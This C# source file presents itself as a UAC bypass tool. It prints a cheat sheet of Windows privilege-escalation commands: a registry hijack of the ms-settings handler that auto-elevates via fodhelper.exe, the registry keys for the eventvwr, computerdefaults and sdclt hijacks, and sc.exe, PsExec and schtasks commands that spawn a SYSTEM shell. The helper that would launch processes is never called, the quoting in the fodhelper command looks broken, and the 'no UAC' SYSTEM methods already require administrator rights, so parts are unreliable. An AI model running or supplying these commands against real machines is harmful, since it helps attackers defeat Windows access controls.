// ULP_Bypass.cs - UAC bypass via signed MS binaries (LOLBin technique)
// Bypasses UAC using trusted Microsoft processes
// Compile: csc.exe /out:%TEMP%\r.exe ULP_Bypass.cs
//
using System;
using System.Diagnostics;

class ULPBypass {
    static void Run(string exe, string args) {
        try {
            var p = new ProcessStartInfo(exe, args);
            p.UseShellExecute = false;
            p.CreateNoWindow = false;
            using (var q = Process.Start(p)) { q.WaitForExit(); }
        } catch (Exception e) { Console.WriteLine("  [!] " + e.Message); }
    }
    
    static void Main(string[] args) {
        Console.WriteLine();
        Console.WriteLine("=== UAC Bypass methods ===");
        Console.WriteLine();
        
        // Method 1: fodhelper.exe (Win10+, signed)
        Console.WriteLine("--- Method 1: fodhelper.exe (Win10+) ---");
        Console.WriteLine("Uses fodhelper.exe to run a command in elevated context");
        Console.WriteLine("Usage: powershell -Command \"New-Item 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Force; Set-ItemProperty 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' '(New-Object -Com Shell.Application).ShellExecute(\\\"C:\\Windows\\System32\\cmd.exe\\\", \\\"args\\\", \\\\\\\"runas\\\\\\\", \\\\\\\"0\\\\\\\" )';\"");
        Console.WriteLine("Run: fodhelper.exe (auto-elevates)");
        
        // Method 2: eventvwr.exe (Vista+, signed)
        Console.WriteLine();
        Console.WriteLine("--- Method 2: eventvwr.exe ---");
        Console.WriteLine("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command");
        
        // Method 3: computerdefaults.exe (Win10+, signed)
        Console.WriteLine();
        Console.WriteLine("--- Method 3: computerdefaults.exe (Win10 1803+) ---");
        Console.WriteLine("HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command");
        
        // Method 4: sdclt.exe (Win10, signed)
        Console.WriteLine();
        Console.WriteLine("--- Method 4: sdclt.exe (Win10 1709+) ---");
        Console.WriteLine("HKCU\\Software\\Classes\\Folder\\shell\\open\\command");
        
        // Method 5: Run as SYSTEM directly (no UAC)
        Console.WriteLine();
        Console.WriteLine("--- Method 5: Become SYSTEM via signed binary ---");
        Console.WriteLine("sc.exe create \"x\" binPath= \"cmd /c start cmd\" start= demand");
        Console.WriteLine("sc.exe start \"x\"");
        Console.WriteLine();
        Console.WriteLine("OR PsExec -s:");
        Console.WriteLine("PsExec.exe -s -d cmd.exe");
        Console.WriteLine();
        Console.WriteLine("OR scheduled task as SYSTEM:");
        Console.WriteLine("schtasks.exe /create /tn \"x\" /tr \"cmd.exe /c start cmd\" /sc once /st 00:00 /ru SYSTEM");
        Console.WriteLine("schtasks.exe /run /tn \"x\"");
    }
}
